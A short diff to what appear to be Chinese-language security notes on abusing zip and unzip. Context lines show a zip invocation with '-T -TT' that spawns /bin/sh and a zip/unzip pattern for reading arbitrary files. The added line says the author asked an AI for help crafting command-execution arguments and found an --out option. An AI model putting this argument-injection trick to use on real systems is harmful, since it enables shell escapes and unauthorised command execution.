@@ -101,3 +101,4 @@ zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #'
 zip /path/to/temp-file /path/to/input-file
 unzip -p /path/to/temp-file
 ```
+这里想构造命令执行的参数，但是构造不了，于是问了ai，发现有一个--out参数。
